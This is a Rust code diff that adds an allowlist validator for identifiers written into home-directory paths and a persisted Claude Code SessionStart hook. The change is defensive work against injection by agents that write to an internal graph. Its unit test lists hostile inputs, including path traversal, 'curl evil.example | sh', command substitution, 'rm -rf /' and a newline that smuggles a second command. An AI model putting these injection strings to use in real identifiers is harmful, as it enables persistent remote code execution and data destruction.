@@ -2677,7 +2677,50 @@ fn short_harness_id(harness_id: &str) -> &str {
     harness_id.strip_prefix("harness:").unwrap_or(harness_id)
 }
 
+/// Reject identifiers that must never reach a filesystem path or a command
+/// string.
+///
+/// Harness, skill, and workflow names are joined into paths under the
+/// operator's home directory and — for the Claude adapter — interpolated into a
+/// `SessionStart` hook that is written to `.claude/settings.json` and executed
+/// at the start of every future session. Two consequences follow: a name
+/// containing `..` or a leading `/` escapes the intended directory, and a name
+/// containing shell metacharacters becomes persisted command execution.
+///
+/// These names are not all operator-typed. Windsurf workflow and skill
+/// filenames are built from intel-graph rows, and the graph accepts writes from
+/// agents over MCP — so a confused or hostile agent can plant one and have
+/// `phil graph harness apply` write through it later.
+///
+/// The allowlist is deliberately narrower than "characters that happen to work"
+/// so the rule is easy to state: lowercase alphanumerics, dot, underscore,
+/// dash. Anything else is refused by name.
+fn validate_harness_identifier(kind: &str, value: &str) -> Result<()> {
+    let bare = short_harness_id(value);
+    if bare.is_empty() {
+        anyhow::bail!("{kind} identifier is empty");
+    }
+    // Reject `.` and `..` outright rather than relying on the charset — both
+    // are composed only of allowed characters but are path traversal.
+    if bare == "." || bare == ".." {
+        anyhow::bail!("{kind} identifier [{value}] is a path traversal component");
+    }
+    if let Some(bad) = bare
+        .chars()
+        .find(|c| !(c.is_ascii_lowercase() || c.is_ascii_digit() || matches!(c, '.' | '_' | '-')))
+    {
+        anyhow::bail!(
+            "{kind} identifier [{value}] contains an unsupported character [{bad}] — \
+             expected only lowercase letters, digits, '.', '_' and '-'. These names are \
+             joined into home-directory paths and, for Claude, into a persisted \
+             SessionStart hook command."
+        );
+    }
+    Ok(())
+}
+
 fn codex_target_path(harness_id: &str) -> Result<PathBuf> {
+    validate_harness_identifier("harness", harness_id)?;
     let home = dirs::home_dir().context("failed to locate home directory")?;
     Ok(home
         .join(".codex")
@@ -3067,6 +3110,10 @@ fn write_claude_code_workspace_files(
         json!({})
     };
 
+    // This string is persisted into settings.json and executed by Claude Code at
+    // the start of every future session, so the interpolated id must not be able
+    // to carry shell syntax.
+    validate_harness_identifier("harness", harness_id)?;
     let verify_cmd = format!(
         "phil graph harness verify {harness_id} 2>/dev/null | grep -E 'clean|drifted|pending_verify' || true"
     );
@@ -3201,6 +3248,8 @@ fn write_windsurf_workspace_files(
     let root = std::env::current_dir().context("failed to locate current workspace")?;
     let skills_root = root.join(".windsurf").join("skills");
     for skill in skills {
+        // Skill names come from the intel graph, which accepts agent writes.
+        validate_harness_identifier("skill", skill)?;
         let skill_dir = skills_root.join(format!("philotic-{}", skill));
         let skill_path = skill_dir.join("SKILL.md");
         let skill_md = render_windsurf_skill_markdown(skill);
@@ -3225,6 +3274,9 @@ fn write_windsurf_workspace_files(
                     .collect::<Vec<_>>()
             })
             .unwrap_or_default();
+        // Likewise graph-sourced; a name of `../../.claude/settings` would
+        // otherwise write straight through the intended directory.
+        validate_harness_identifier("workflow", &workflow.name)?;
         let workflow_path = workflows_root.join(format!("{}.md", workflow.name));
         let markdown = render_windsurf_workflow_markdown(
             &workflow.name,
@@ -3610,6 +3662,45 @@ fn parse_csv_list(value: &str) -> Vec<String> {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn harness_identifiers_reject_traversal_and_shell_metacharacters() {
+        // These names reach a persisted SessionStart hook command and paths
+        // under the operator's home directory.
+        for hostile in [
+            "../../../../tmp/pwned",
+            "..",
+            ".",
+            "/etc/passwd",
+            "claude; curl evil.example | sh",
+            "claude$(whoami)",
+            "claude`id`",
+            "claude&&rm -rf /",
+            "claude local",  // whitespace
+            "claude\nlocal", // newline injects a second command
+            "Claude-Local",  // uppercase is outside the allowlist
+            "",
+        ] {
+            assert!(
+                validate_harness_identifier("harness", hostile).is_err(),
+                "{hostile:?} must be rejected"
+            );
+        }
+
+        // Real identifiers still pass, with and without the `harness:` prefix.
+        for good in [
+            "claude-local",
+            "harness:claude-local",
+            "codex-local",
+            "windsurf.native",
+            "agent_2",
+        ] {
+            assert!(
+                validate_harness_identifier("harness", good).is_ok(),
+                "{good:?} must be accepted"
+            );
+        }
+    }
 
     #[test]
     fn trial_activity_requires_at_least_one_signal() {
